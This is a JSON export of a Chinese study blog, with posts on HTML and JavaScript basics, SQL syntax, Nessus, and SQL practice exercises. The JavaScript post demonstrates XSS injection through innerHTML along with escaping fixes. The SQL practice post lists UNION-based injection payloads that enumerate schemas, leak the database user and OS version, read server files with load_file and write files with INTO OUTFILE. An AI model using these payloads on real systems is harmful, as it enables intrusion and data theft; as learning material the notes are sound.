{"meta":{"title":"DiZai","subtitle":"Just do IT","description":"一只不断学习的小菜鸟","author":"迪仔","url":"http://yoursite.com"},"pages":[{"title":"about","date":"2018-08-09T06:18:29.000Z","updated":"2018-08-09T06:20:58.831Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"关于我不断试错，从错误中学到东西，就是一个小成功吧。"},{"title":"categories","date":"2018-08-09T06:14:16.000Z","updated":"2018-08-09T06:16:50.488Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-09T06:09:41.000Z","updated":"2018-08-09T06:10:53.404Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"JavaScript脚本语言学习分享","slug":"JavaScript脚本语言学习分享","date":"2018-08-23T14:56:27.000Z","updated":"2018-08-23T15:39:06.360Z","comments":true,"path":"2018/08/23/JavaScript脚本语言学习分享/","link":"","permalink":"http://yoursite.com/2018/08/23/JavaScript脚本语言学习分享/","excerpt":"【前言】JavaScript是脚本语言，又称为动态语言，是一种编程语言，用来控制软件应用程序，通常以文本保存，只在调用时调用进行编译。JavaScript 是可插入 HTML 页面的编程代码JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行","text":"【前言】JavaScript是脚本语言，又称为动态语言，是一种编程语言，用来控制软件应用程序，通常以文本保存，只在调用时调用进行编译。JavaScript 是可插入 HTML 页面的编程代码JavaScript 插入 HTML 页面后，可由所有的现代浏览器执行 JavaScript实现： HTML 中的脚本必须位于 与 标签之间。 脚本可被放置在 HTML 页面的 和 部分中。 HTML常用标签a标签 用来实现超链接 href 属性规定链接的目标 开始标签和结束标签之间的文字被作为超级链接来显示 例：1&lt;a href=&quot;http://www.gooann.com&quot;&gt;点击我跳转&lt;/a&gt; 点击后跳转到www.gooann.com的页面 P标签 定义一个段落 浏览器会自动地在段落的前后添加空行 例：12&lt;p&gt;我是一个段落&lt;/p&gt; &lt;/br&gt; 换行 h标签1234过 &lt;h1&gt; - &lt;h6&gt; 等标签进行定义的&lt;h1&gt; 定义最大的标题&lt;h6&gt; 定义最小的标题浏览器会自动地在段落的前后添加空行例： &lt;h1&gt;我是标题1&lt;/h1&gt; div标签 标签定义文档中的区域块 例：1&lt;div &gt;我是一个区域块&lt;/div&gt; button标签 标签定义一个按钮 例： 1&lt;button type=“button”&gt;我是一个按钮&lt;/button&gt; 表格（table、tr、th、td） 简单的 HTML 表格由 table 元素以及一个或多个 tr、th 或 td 元素组成 tr 元素定义表格行，th 元素定义表头，td 元素定义表格单元 例：1234&lt;table&gt; ​ &lt;tr&gt; &lt;th&gt; &lt;/th&gt;&lt;th&gt; &lt;/th&gt;&lt;/tr&gt;​ &lt;tr&gt; &lt;td&gt; &lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; input标签 根据不同的 type 属性值，输入字段拥有很多种形式 （text（文本）、button（按钮）、checkbox（勾选）、file（选文件）、hidden（）、password、radio（圆点勾选） 例：1&lt;input type=&quot;text&quot; /&gt; HTML常用style属性用Style来定义标签元素的字体颜色、背景色、高度宽度等属性。 color：字体颜色 background：背景色 width、height：宽度、高度 JavaScript获取元素的方法通过id获得（document.getElementById） 通过标签获得（document.getElementsByTagName） 通过类名获得（document.getElementsByClassName ） JavaScript修改HTML改变 HTML 元素内容（innerHTML、input标签的value） 改变 HTML 元素样式（style.color） 改变 HTML 元素属性（如src） JavaScript事件响应1、鼠标点击事件onclick1234567891）onclick=&quot;this.innerHTML=&apos;谢谢!&apos;&quot;2）document.getElementById(id).onclick=function()&#123;alert(&apos;谢谢’)&#125;; &lt;script&gt;中添加3）&lt;h1 id=&quot;h1&quot; onclick=“change(this)&quot;&gt;请点击该文本&lt;/h1&gt;&lt;script&gt; function change(elment)&#123; elment.innerHTML=&quot;谢谢&quot;; &#125;&lt;/script&gt;4) onclick=&quot;javascript:document.getElementById(&apos;h1&apos;).innerHTML=&apos;谢谢&apos;&quot; 2.鼠标移入移出鼠标移入（onmouseover） 鼠标移出（onmouseout） 例题：1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;div onmouseover=&quot;mOver(this)&quot; onmouseout=&quot;mOut(this)&quot; style=&quot;background-color:green;width:120px;height:20px;padding:40px;text-align:center;color:#ffffff;&quot;&gt;便利店&lt;/div&gt;&lt;script&gt; function mOver(obj)&#123;​ obj.innerHTML=&quot;欢迎光临&quot;; &#125; function mOut(obj)&#123;​ obj.innerHTML=&quot;再见&quot;;​ setTimeout(function()&#123;obj.innerHTML=&quot;便利店&quot;&#125;,1000); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 3.鼠标左键按下和放开鼠标左键按下（onmousedown） 鼠标左键放开（onmouseup） . 例题：123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;div onmousedown=&quot;mDown(this)&quot; onmouseup=&quot;mUp(this)&quot; style=&quot;background-color:green;color:#ffffff;width:90px;height:20px;padding:40px;font-size:12px;&quot;&gt;请点击这里&lt;/div&gt;&lt;script&gt; function mDown(obj)&#123;​ obj.style.backgroundColor=&quot;#1ec5e5&quot;;​ obj.innerHTML=&quot;请释放鼠标按钮&quot; &#125; function mUp(obj)&#123;​ obj.style.backgroundColor=&quot;green&quot;;​ obj.innerHTML=&quot;请按下鼠标按钮&quot; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4、获得焦点和失去焦点获得焦点（onfocus） 失去焦点（onblur） 例题：123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;输入框1：&lt;input type=&quot;text&quot; onfocus=&quot;Mfocus(this)&quot; onblur=&quot;Mblur(this)&quot;&gt;&lt;br&gt;输入框2：&lt;input type=&quot;text&quot; onfocus=&quot;Mfocus(this)&quot; onblur=&quot;Mblur(this)&quot;&gt;&lt;script&gt; function Mfocus(obj)&#123;​ obj.style.background=&quot;yellow&quot;; &#125; function Mblur(obj)&#123;​ obj.style.background=&quot;white&quot;; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 5、加载文档或图片响应onerror 例题：123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;img src=&quot;./images/pic_bulboff.gif&quot; onerror=&quot;message()&quot;&gt;&lt;script&gt; function message()&#123;​ alert(&quot;未找到资源&quot;); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript添加元素1、添加元素的步骤创建元素（document.createElement） 创建元素文本（document.createTextNode） 向创建的元素追加文本（ appendChild ） 将追加好文本的元素添加到已知元素（父元素）（ appendChild ） 例题：123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;div&quot; style=&quot;color:red;background:yellow;width:200px&quot;&gt;​ &lt;h3&gt;我是一个标题3&lt;/h3&gt;​ &lt;p&gt;我是一个段落&lt;/p&gt; &lt;/div&gt; &lt;button onclick=&quot;add()&quot;&gt;添加元素&lt;/button&gt;&lt;script&gt;function add()&#123;​ var nobj = document.createElement(&quot;p&quot;);​ var node = document.createTextNode(&quot;我是新的段落&quot;); nobj.appendChild(node);​ document.getElementById(&quot;div&quot;).appendChild(nobj);&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript删除元素2、删除元素的步骤找到要删除元素的父元素（document.getElementById(父元素id)） 找到要删除的元素（document.getElementById(子元素id)） 从父元素删除子元素（ 父元素.removeChild(子元素) ） 例题：1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div id=&quot;div&quot; style=&quot;color:red;background:yellow;width:200px&quot;&gt;​ &lt;h3 id=&quot;h&quot;&gt;我是一个标题3&lt;/h3&gt;​ &lt;p id=&quot;p&quot;&gt;我是一个段落&lt;/p&gt; &lt;/div&gt; &lt;button onclick=&quot;del()&quot;&gt;删除元素&lt;/button&gt;&lt;script&gt;function del()&#123;​ var par = document.getElementById(&quot;div&quot;);​ var chi = document.getElementById(&quot;h&quot;);​ par.removeChild(chi);&#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript基本语法 用var来进行变量声明 字符：var name=”Bill Gates”; var name=”Bill”+” Gates”; 数值：var x=5; var x=2+3; 日期：var myDate=new Date() ; ①var mycars=new Array(); mycars[0]=”BMW”; mycars[1]=“Audi”; mycars[2]=”Benz”; ②var mycars=new Array(“BMW”, “Audi”, “Benz”); 例题：12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;显示&lt;/button&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var name=&quot;Bill&quot;+&quot; Gates&quot;; ​ var x=2+3;​ var myDate=new Date();​ var mycars=new Array();​ mycars[0]=&quot;BMW&quot;; mycars[1]=&quot;Audi&quot;; mycars[2]=&quot;Benz&quot;;​ var mycars2=new Array(&quot;BMW&quot;, &quot;Audi&quot;, &quot;Benz&quot;);​ alert(name);​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 2 . If 语句if(条件){代码} if(条件){代码}else{代码} if(条件){代码}else if(条件){代码}else{代码} 例题：1234567891011121314151617181920212223242526&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ text:&lt;input id=&quot;in&quot; type=&quot;text&quot; /&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;奇偶判断&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;p/&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var val = document.getElementById(&quot;in&quot;).value;​ if(val === &quot;&quot; || val == null)&#123;​ document.getElementById(&quot;p&quot;).innerHTML = &quot;输入为空&quot;;​ &#125;else if(isNaN(val))&#123;​ document.getElementById(&quot;p&quot;).innerHTML = &quot;输入不是数字&quot;;​ &#125;else&#123;​ if(val%2 == 0)&#123; ​ document.getElementById(&quot;p&quot;).innerHTML = val+&quot;是偶数&quot;;​ &#125;else&#123; ​ document.getElementById(&quot;p&quot;).innerHTML = val+&quot;是奇数&quot;;​ &#125; ​ &#125;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 3 . Switch 语句12345678switch(n) &#123; case 1: 执行代码块 1​ break;​ case 2: 执行代码块 2​ break;​ default:​ 都不满足时执行的代码​ &#125; 例题：12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ text:&lt;input id=&quot;in&quot; type=&quot;date&quot; /&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;判断周末&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;p/&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var x = &quot;&quot;;​ var text = document.getElementById(&quot;in&quot;).value;​ var day = new Date(text).getDay();​ switch (day)&#123;​ case 0:​ x = text+&quot;是周末&quot;;​ break;​ case 6:​ x = text+&quot;是周末&quot;;​ break;​ default:​ x = text+&quot;不是周末&quot;;​ &#125;​ document.getElementById(&quot;p&quot;).innerHTML = x;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 4.for 循环（可以遍历元素）123456for (语句 1; 语句 2; 语句 3) &#123; 被执行的代码块 &#125; 语句1 在循环开始之前设置变量 (如：var i=0)。 语句2 定义循环运行的条件（如：i &lt; 5） 语句3 在每次代码块已被执行后增加一个值 (如：i++) 例题：123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ &lt;p&gt;我是第一段&lt;/p&gt;​ &lt;p&gt;我是第二段&lt;/p&gt;​ &lt;p&gt;我是第三段&lt;/p&gt;​ &lt;p&gt;我是第四段&lt;/p&gt;​ &lt;p&gt;我是第五段&lt;/p&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;改变&lt;/button&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var obj = document.getElementsByTagName(&quot;p&quot;);​ for (var i=0;i&lt;obj.length;i++)&#123;​ obj[i].innerHTML = &quot;我是第&quot;+(i+1)+&quot;段&quot;;​ &#125;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 5 . while 循环123while (条件) &#123; 需要执行的代码 &#125; 例题：1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt; &lt;div&gt;​ &lt;p&gt;我是第一段&lt;/p&gt;​ &lt;p&gt;我是第二段&lt;/p&gt;​ &lt;p&gt;我是第三段&lt;/p&gt;​ &lt;p&gt;我是第四段&lt;/p&gt;​ &lt;p&gt;我是第五段&lt;/p&gt;​ &lt;button onclick=&quot;test1()&quot;&gt;改变&lt;/button&gt; &lt;/div&gt; &lt;script&gt;​ function test1()&#123;​ var obj = document.getElementsByTagName(&quot;p&quot;);​ var i = 0;​ while (i &lt; obj.length)&#123;​ obj[i].innerHTML = &quot;我是第&quot;+(i+1)+&quot;段&quot;;​ i++;​ &#125;​ &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; JavaScript安全性XSS攻击路径： 2 . 下面这个页面注入一个弹出框12345678910 &lt;div&gt;​ text:&lt;input id=&quot;in&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;test()&quot;&gt;测试&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;/p&gt; &lt;/div&gt; &lt;script&gt;​ function test()&#123;​ var a = document.getElementById(&quot;in&quot;).value;​ document.getElementById(&quot;p&quot;).innerHTML = a;​ &#125; &lt;/script&gt; 如果我们在输入框中输入： ​ 你好alert(“1”) 会形成一个带弹出框的页面。 3 . 改变页面a标签的超链接1234567891011 &lt;div&gt;​ &lt;a id=&quot;a&quot; href=&quot;http://www.sina.com.cn&quot; target=&quot;_blank&quot;&gt;跳转到某门户网站&lt;/a&gt;​ &lt;br&gt;&lt;/&gt;text:&lt;input id=&quot;in&quot; type=&quot;text&quot; /&gt;&lt;button onclick=&quot;test()&quot;&gt;测试&lt;/button&gt;​ &lt;br&gt;&lt;p id=&quot;p&quot;&gt;&lt;/p&gt; &lt;/div&gt; &lt;script&gt;​ function test()&#123;​ var a = document.getElementById(&quot;in&quot;).value;​ document.getElementById(&quot;p&quot;).innerHTML = a;​ &#125;​ &lt;/script&gt; 如果我们在输入框中输入： ​ 你好document.getElementById(“a”).href = ​ “http://www.gooann.com&quot;;alert(&quot;我改变了链接&quot;) 会形成一个改变链接地址的页面。 产生问题的原因：带有HTML标签的输入被存储并反应到了页面上 解决方法：在使用用户输入、后台存储、以及页面反应时， ​ 使用函数去掉HTML标签或转义字符 JavaScript: textContent、encodeURIComponent() PHP: htmlspecialchars()、trim()、strip_tags()、addslashes() 5、JavaScript代码的安全性textContent ​ 不返回html文本，性能更好，安全性更高。返回纯文本，不带任何标签。 encodeURIComponent() ​ 对字符串替换所有非字母数字字符，安全性提高 6、PHP代码安全性htmlspecialchars() ​ 把“ （双引号）、‘ （单引号）、&lt; （小于）、&gt; （大于）等转化为实体 trim(string,charlist) ​ 去掉字符串两端预定义的字符，默认去掉 ​ “\\0” (NULL) ​ “\\t” (制表符) ​ “\\n” (换行) ​ “\\x0B” (垂直制表符) ​ “\\r” (回车) ​ “ “ (空格) strip_tags() ​ 从字符串中去除 HTML 和 PHP 标记 addslashes(string) ​ 向字符串中的预定义字符添加反斜杠，默认 ​ 单引号（’） ​ 双引号（”） ​ 反斜杠（\\） ​ NULL jQuery的介绍1、引入jQuery文件在head中引入jQuery文件 ​ 2、jQuery元素选择器id选择器：$(“#id”) 类选择器：$(“.class”) 元素选择器：$(“p”) ※获取内容：.text()、.html()、.val() ​ 设置内容： .text(内容)、.html(内容)、.val(内容) 例题：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;script src=&quot;http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;p id=&quot;id1&quot; class=&quot;classp&quot;&gt;这是段落1&lt;/p&gt; &lt;p id=&quot;id2&quot; class=&quot;classp&quot;&gt;这是段落2&lt;/p&gt; &lt;p id=&quot;id3&quot; class=&quot;classp&quot;&gt;这是段落3&lt;/p&gt; &lt;p id=&quot;id4&quot; class=&quot;classp&quot;&gt;这是段落4&lt;/p&gt; &lt;p id=&quot;id5&quot; class=&quot;classp&quot;&gt;这是段落5&lt;/p&gt; &lt;input type=&quot;text&quot; class=&quot;classin&quot;/&gt; &lt;button onclick=&quot;test()&quot; &gt;button&lt;/button&gt;&lt;script&gt; function test()&#123; alert($(&quot;#id2&quot;).text()); $(&quot;p&quot;).each(function()&#123;​ alert($(this).text()) &#125;); alert($(&quot;.classin&quot;).val()); &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://yoursite.com/categories/编程语言/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"}]},{"title":"SQL语句实操","slug":"SQL语句实操","date":"2018-08-22T14:52:09.000Z","updated":"2018-08-22T15:07:46.565Z","comments":true,"path":"2018/08/22/SQL语句实操/","link":"","permalink":"http://yoursite.com/2018/08/22/SQL语句实操/","excerpt":"知识点逻辑运算符： NOT 或 ！：逻辑非 AND 或 &amp;&amp;：逻辑与","text":"知识点逻辑运算符： NOT 或 ！：逻辑非 AND 或 &amp;&amp;：逻辑与 OR 或 ||：逻辑或 XOR：逻辑异或 1、逻辑非 ( NOT 或 ！) (1) 当操作数为 0 时，所得值为 1 (2) 当操作数为非 0 时，所得值为 0 (3) 当操作数为 NULL 时，所得值为 NULL !T = F !F = T 2、逻辑与 ( AND 或 &amp;&amp; ) (1) 当所有操作数均为非零值、并且不为 NULL 时，所得值为 1 (2) 当一个或多个操作数为 0 时，所得值为 0 (3) 其余情况所得值为 NULL T &amp;&amp; T = T T &amp;&amp; F = F F &amp;&amp; F = F 3、逻辑或 ( OR 或 || ) (1) 当两个操作数均为非 NULL 值，且任意一个操作数为非零值时，结果为 1 ，否则为 0 (2) 当有一个操作数为 NULL ，且另一个操作数为非零值时，则结果为 1 ，否则结果为 NULL (3) 当两个操作数均为 NULL 时，则所得结果为 NULL T || T = T T || F = T F || F = F 4、逻辑异或 (1) a XOR b 的计算等同于 ( a AND (NOT b) ) 或 ( (NOT a) AND b ) (2) 当任意一个操作数为 NULL 时，返回值为 NULL (3) 对于非 NULL 的操作数，如果两个操作数都是非 0 值或者都是 0 值，则返回结果为 0 (4) 如果一个为 0 值，另一个为非 0 值，返回结果为 1 T XOR T = F T XOR F = T F XOR F = F 5、逻辑运算符的优先级: 括号&gt;比较运算符&gt;非&gt;与&gt;或 相同优先级的运算符由左向右依次执行 例: 1、Select 1=1 or 1=2 and 2=2 2、Select （ 1=1 or 1=2 ) and 2=2 1、分解为 Select 1=2 and 2=2 结果为 0 Select 1=1 or 0 结果为1 2、分解为 Select 1=1 or 1=2 结果为 1 Select 1 and 2=2 结果为1 表连接：当需要同时显示多个表中的字段时，就可以用表连接来实现，这样的功能。 从大类上分，表连接分为以下4类： 【内连接】：仅选出两张表中互相匹配的记录 【左连接】：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录 【右连接】：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录 【外连接】：两边表中的内容全部显示 SQL连接（JOIN）SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。 最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。 INNER JOIN：如果表中有至少一个匹配，则返回行 SQL INNER JOIN 语法 SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name; select student.student_name,student.student_sex,grade.subject1,grade.grade1,grade.createtimestamp,grade.updatetimestamp ​ -&gt; from student ​ -&gt; inner join grade ​ -&gt; on student.student_id=grade.student_id; LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 SQL LEFT JOIN 语法SELECT column_name(s) FROM table1 LEFT JOIN table2 ON table1.column_name=table2.column_name; RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 SQL RIGHT JOIN 语法SELECT column_name(s) FROM table1 RIGHT JOIN table2 ON table1.column_name=table2.column_name; FULL JOIN：只要其中一个表中存在匹配，则返回行 SQL FULL OUTER JOIN 语法 SELECT column_name(s) FROM table1 FULL OUTER JOIN table2 ON table1.column_name=table2.column_name; 练习题：student表 student_score表 1.插入一条学生学籍信息，及两条学生成绩信息。 insert into student values(‘13’,’张三’,’男’,’福建’,’泉州’,null’,’23’,null); insert into student_score values(‘10’,’Python入门’,’80.5’,’16’,null,null); insert into student_score values(‘11’,’密码学基本原理’,’95.5’,’16’,null,null); 2.查询目前都有哪些课程。 select distinct lesson from student_score; //distinct去除重复的课程 3.查询学生姓名学了哪些课程，每门课程的成绩 select student.student_name,student_score.lesson,student_score.score from student inner join student_score on student.student_id=student_score.student_id; 4.查询某一课程最高分数的学生的姓名 方法一：SELECT student_name,score,lesson from student,student_score where student_score.lesson=(‘WEB安全’) and student.student_id=student_score.student_id order by student_score.score desc LIMIT 1; 方法二：select a.student_name,b.score from student a,student_score b where a.student_id=b.student_id and b.score = (select max(score) from student_score where lesson = ‘SQL基本语法’) and lesson = ‘SQL基本语法’; 5.查询所有学生学籍信息及某一科课程的课程名称、成绩、学时。 select student.*,student_score.lesson,student_score.score,student_score.duration from student left join student_score on student.student_id=student_score.student_id; （2） select * from student where student_id = ‘$student_id’ 以上SQL语句中，$student_id为变量，可以用字符串代替 要求:1.查询所有学生的信息 select from student where student_id = ‘1’ and 1=2 UNION select from student– ‘ 2.查询表结构 select * from information_schema.columns where TABLE_NAME=’student’; select * from student where student_id = ‘’ UNION select COLUMN_NAME,DATA_TYPE,COLUMN_TYPE,COLUMN_DEFAULT,IS_NULLABLE,COLUMN_KEY,EXTRA,8 from information_schema.columns where TABLE_NAME=(‘student’) – ‘ ; 3.获取数据库信息 select * from student where student_id = ‘ 1’ and 1=2 UNION SELECT 1,database(),user(),VERSION(),5,6,7,8 – ‘ 4.获得操作系统信息 select * from student where student_id = ‘’ UNION SELECT 1,@@global.version_compile_os,3,4,5,6,7,8 – ‘ 或select * from student where student_id = ‘1’and 1=2 union select 1,2,3,4,5,6,7,@@global.version_compile_os from mysql.user ; 5.查看所有数据库名称 select * from student where student_id = ‘’ UNION select 1,TABLE_NAME,3,4,5,6,7,8 from information_schema.columns – ‘ 继续：1.用load_file读取文件 C:\\Program Files\\MySQL\\MySQL Server 5.5\\my.ini select * from student where student_id = ‘’ union select 1,1,1,1,load_file(‘C:\\Program Files\\MySQL\\MySQL Server 5.5\\my.ini’),2,3,4 – ‘ 2.将student表内容导出到文件当中 select * from student into outfile (‘C:\\Program Files\\MySQL\\MySQL Server 5.5\\hyd.txt’) 3.查询学生姓名及【SQL基本语法】成绩、并对成绩按照以下分类 100-85 优 85-70 良 60-70 中 60以下 差 select a.student_name,b.lesson,b.score, (case when b.score &gt; 85 then ‘优’ when b.score &gt; 70 then ‘良’ when b.score &gt; 60 then ‘中’ else ‘差’ end) as ‘result’ from student a,student_score b where a.student_id=b.student_id and b.lesson=(‘SQL基本语法’); 补充：case语句用法 4.尝试通过mysql查询语句库和站是否分离 exists(select * from student where 1=(Select (case when host_name()=@servername then 1 else 0 end))) 5.利用ascii码10进制打出”SQL lesson” select ASCII(‘n’) as result from dual select char(83,81,76,32,108,101,115,115,111,110) as result from dual 6.查询student数据库存放的物理位置例如”c:\\users\\temp” show GLOBAL variables like “%data%” 7.写出猜测当前用户权限的SQL select * from student where student_id = ‘1’ and ord(mid(user(),1,1))=116 参考文献http://www.runoob.com/sql/sql-join.html","categories":[{"name":"编译语言","slug":"编译语言","permalink":"http://yoursite.com/categories/编译语言/"}],"tags":[{"name":"SQL语句","slug":"SQL语句","permalink":"http://yoursite.com/tags/SQL语句/"}]},{"title":"SQL语句基础","slug":"SQL语句基础","date":"2018-08-22T14:23:00.000Z","updated":"2018-08-22T14:49:56.442Z","comments":true,"path":"2018/08/22/SQL语句基础/","link":"","permalink":"http://yoursite.com/2018/08/22/SQL语句基础/","excerpt":"【前言】结构化查询语言（Structured Query Language）简称为SQL。是一种特殊目的的编程语言，是一种与数据库进行交互的程序设计语言。","text":"【前言】结构化查询语言（Structured Query Language）简称为SQL。是一种特殊目的的编程语言，是一种与数据库进行交互的程序设计语言。 SQL作用： 用于存取数据以及查询、更新和管理关系型数据库。用于存取数据以及查询、更新和管理关系型数据库。 关系型数据库： 1.可以用SQL语句方便的在一个表以及多个表之间做非常复杂的数据查询。 2.支持事务、使得对于安全性能很高的数据访问要求得以实现。 包括Mysql、Oracle、Sql Server、DB2、ACCESS 非关系型数据库： 1.NOSQL是基于键值对的，不需要经过SQL层的解析，所以性能非常高。 2.同样也是因为基于键值对，数据之间没有耦合性，所以非常容易水平扩展。 3.基于以上特点、目前流行的大数据处理多数会选择NOSQL数据库。 （包括NoSql）:MongoDB、Redis、neo4j） SQL类型： DCL：数据控制语言 DDL：数据定义语言 DML:数据操作语言 1234567891011net start mysql \\#启动mysql服务器 net stop mysql #关闭 mysql -h 主机地址 -u 用户名 －p 用户密码 #进入 exit #退出 status; #显示当前mysql的version的各种信息。show databases; \\#显示数据库 12345678910111213#插入数据 insert into student values(null,&apos;aa&apos;,&apos;男&apos;,&apos;1988-10-2&apos;,&apos;......&apos;); insert into student values(null,&apos;bb&apos;,&apos;女&apos;,&apos;1889-03-6&apos;,&apos;......&apos;); insert into student values(null,&apos;cc&apos;,&apos;男&apos;,&apos;1889-08-8&apos;,&apos;......&apos;); insert into student values(null,&apos;dd&apos;,&apos;女&apos;,&apos;1889-12-8&apos;,&apos;......&apos;); insert into student values(null,&apos;ee&apos;,&apos;女&apos;,&apos;1889-09-6&apos;,&apos;......&apos;); insert into student values(null,&apos;ff&apos;,&apos;null&apos;,&apos;1889-09-6&apos;,&apos;......&apos;); 12345#查询表中的数据 select * from student; select id,name from student; 123#修改某一条数据 update student set sex=&apos;男&apos; where id=4; 1234567891011121314151617#删除数据delete from student where id=5; #and 且select * from student where date&gt;&apos;1988-1-2&apos; and date&lt;&apos;1988-12-1&apos;; #or 或select * from student where date&lt;&apos;1988-11-2&apos; or date&gt;&apos;1988-12-1&apos;; #betweenselect * from student where date between &apos;1988-1-2&apos; and &apos;1988-12-1&apos;; #in 查询制定集合内的数据select * from student where id in (1,3,5); #排序 asc 升序 desc 降序select * from student order by id asc; SELECT语句中常用的函数： CONCAT：将多个字符串连接成一个字符串。 CONCAT_WS：是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位 置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是 其它参数。 GROUP_CONCAT：group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排 序字段] [Separator ‘分隔符’]) AVG () ：返回数值列的平均值。NULL 值不包括在计算中。 COUNT() ：返回指定列的值的数目（NULL 不计入）。 MAX()：返回一列中的最大值。NULL 值不包括在计算中。 MIN()：返回一列中的最小值。NULL 值不包括在计算中。 SUM()：返回数值列的总数（总额）。 LEN()：返回文本字段中值的长度。 ROUND(column_name,decimals)：用于把数值字段舍入为指定的小数位数。 #分组查询 #聚合函数1select max(id),name,sex from student group by sex; 1select min(date) from student; 1select avg(id) as &apos;求平均&apos; from student; 1select count(*) from student; #统计表中总数 1select count(sex) from student; #统计表中性别总数 若有一条数据中sex为空的话,就不予以统计~ 1select sum(id) from student; #查询第i条以后到第j条的数据(不包括第i条)1select * from student limit 2,5; #显示3-5条数据 参考文献：https://www.cnblogs.com/zhuyongzhe/p/7686105.html","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://yoursite.com/categories/编程语言/"}],"tags":[{"name":"SQL语句","slug":"SQL语句","permalink":"http://yoursite.com/tags/SQL语句/"}]},{"title":"Nessus基本使用","slug":"Nessus基本使用","date":"2018-08-22T13:49:04.000Z","updated":"2018-08-23T13:40:12.991Z","comments":true,"path":"2018/08/22/Nessus基本使用/","link":"","permalink":"http://yoursite.com/2018/08/22/Nessus基本使用/","excerpt":"【前言】Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。","text":"【前言】Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。 Nessus支持比竞争对手解决方案更多的技术，扫描操作系统，网络设备，虚拟机管理程序，数据库，Web服务器以及关键基础设施，以解决漏洞，威胁和违规问题。 随着世界上最大的不断更新的漏洞和配置检查库，以及Tenable公司的专家漏洞研究小组的支持，Nessus设定了漏洞扫描速度和准确性的标准。 特点： 提供完整的电脑漏洞扫描服务, 并随时更新其漏洞数据库。 可同时在本机或远端上摇控, 进行系统的漏洞分析扫描。 其运作效能能随着系统的资源而自行调整。 可自行定义插件(Plug-in)，完整支持SSL (Secure Socket Layer)。 Nessus导航 ​ 顶部的导航条显示两个主页面的链接：扫描和设置。您可以使用这两个页面执行所有Nessus主要任务。点击页面名称打开相应的页面。 扫描 ​ 在“ 扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“ 扫描”页面，请在顶部导航栏中单击“ 扫描”。左侧导航栏显示文件夹和资源两部分。 文件夹 